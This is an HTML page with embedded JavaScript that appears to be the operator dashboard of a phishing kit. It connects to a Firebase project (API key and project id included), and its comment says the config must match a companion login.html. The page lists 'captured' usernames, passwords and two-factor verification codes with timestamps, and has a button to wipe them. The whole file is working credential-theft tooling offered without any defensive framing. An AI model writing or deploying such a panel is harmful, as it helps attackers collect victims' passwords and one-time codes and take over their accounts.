<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Credentials</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            text-align: center;
            margin-bottom: 30px;
        }
        .credential {
            border: 1px solid #ddd;
            padding: 15px;
            margin: 10px 0;
            border-radius: 5px;
            background-color: #f9f9f9;
        }
        .credential p {
            margin: 5px 0;
        }
        .credential strong {
            color: #333;
        }
        .no-credentials {
            text-align: center;
            color: #666;
            padding: 20px;
        }
        .refresh-btn {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
            margin-right: 10px;
        }
        .refresh-btn:hover {
            background-color: #45a049;
        }
        .header-actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .credential-count {
            color: #666;
            font-size: 14px;
        }
        .clear-btn {
            background-color: #d9534f;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
        }
        .clear-btn:hover {
            background-color: #c9302c;
        }
        .error-message {
            color: #d9534f;
            background-color: #f9f2f4;
            padding: 15px;
            border-radius: 4px;
            margin: 10px 0;
            border: 1px solid #d9534f;
        }
        .loading {
            text-align: center;
            color: #666;
            padding: 20px;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Captured Credentials</h1>
    <div class="header-actions">
        <div class="credential-count" id="credentialCount">Loading...</div>
        <div>
            <button class="refresh-btn" onclick="loadCredentials()">Refresh</button>
            <button class="clear-btn" onclick="clearCredentials()">Clear All</button>
        </div>
    </div>
    <div id="credentials"></div>
</div>

<!-- Firebase SDK -->
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>

<script>
    // Your Firebase configuration - must match login.html
    const firebaseConfig = {
        apiKey: "AIzaSyCIhHiH2itV7A2SxMY0g3fFsg0iQwfA4pI",
        authDomain: "login-ffcdd.firebaseapp.com",
        projectId: "login-ffcdd",
        storageBucket: "login-ffcdd.firebasestorage.app",
        messagingSenderId: "28209257330",
        appId: "1:28209257330:web:bf28e753372939b3629beb"
    };

    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    
    // Load credentials when the page loads
    window.onload = function() {
        loadCredentials();
    };
    
    function loadCredentials() {
        const container = document.getElementById('credentials');
        const countElement = document.getElementById('credentialCount');
        
        container.innerHTML = '<div class="loading">Loading credentials...</div>';
        
        // Get all credentials from Firestore
        db.collection("credentials").get()
        .then((querySnapshot) => {
            // Update count
            countElement.textContent = `${querySnapshot.size} credential(s) captured`;
            
            if (querySnapshot.size === 0) {
                container.innerHTML = '<div class="no-credentials">No credentials captured yet.</div>';
                return;
            }
            
            container.innerHTML = '';
            
            // Convert to array and sort by timestamp (newest first)
            const credentials = [];
            querySnapshot.forEach((doc) => {
                const data = doc.data();
                data.id = doc.id;
                credentials.push(data);
            });
            
            credentials.sort((a, b) => {
                return new Date(b.timestamp) - new Date(a.timestamp);
            });
            
            // Display each credential
            credentials.forEach((cred) => {
                const credential = document.createElement('div');
                credential.className = 'credential';
                
                // Format the timestamp for better readability
                let formattedTime = cred.timestamp;
                try {
                    const date = new Date(cred.timestamp);
                    formattedTime = date.toLocaleString();
                } catch (e) {
                    // Keep original if parsing fails
                }
                
                // Build the HTML content
                let htmlContent = `
                    <p><strong>Username:</strong> ${cred.username}</p>
                    <p><strong>Password:</strong> ${cred.password}</p>
                `;
                
                // Add verification code if it exists
                if (cred.verification) {
                    htmlContent += `<p><strong>Verification Code:</strong> ${cred.verification}</p>`;
                }
                
                // Add timestamp
                htmlContent += `<p><strong>Time:</strong> ${formattedTime}</p>`;
                
                credential.innerHTML = htmlContent;
                container.appendChild(credential);
            });
        })
        .catch((error) => {
            console.error("Error loading credentials: ", error);
            container.innerHTML = `<div class="error-message">Error loading credentials: ${error.message}</div>`;
            countElement.textContent = 'Error';
        });
    }
    
    function clearCredentials() {
        if (confirm('Are you sure you want to clear all credentials? This action cannot be undone.')) {
            // Get all credentials
            db.collection("credentials").get()
            .then((querySnapshot) => {
                // Delete each credential
                const batch = db.batch();
                querySnapshot.forEach((doc) => {
                    batch.delete(doc.ref);
                });
                
                // Commit the batch
                return batch.commit();
            })
            .then(() => {
                console.log("All credentials deleted");
                loadCredentials();
            })
            .catch((error) => {
                console.error("Error clearing credentials: ", error);
                alert('Error clearing credentials: ' + error.message);
            });
        }
    }
</script>

</body>
</html>
